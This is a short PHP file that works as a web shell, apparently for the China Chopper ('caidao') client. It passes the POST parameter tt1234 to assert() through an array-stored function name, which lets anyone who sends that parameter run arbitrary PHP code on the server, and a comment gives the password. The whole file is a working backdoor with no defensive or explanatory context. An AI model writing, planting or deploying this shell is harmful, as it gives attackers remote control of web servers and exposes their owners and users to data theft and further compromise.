<?php 
$item['tt'] = 'assert'; 
$array[] = $item; 
$array[0]['tt']($_POST['tt1234']);  //caidao  password: tt1234 
?>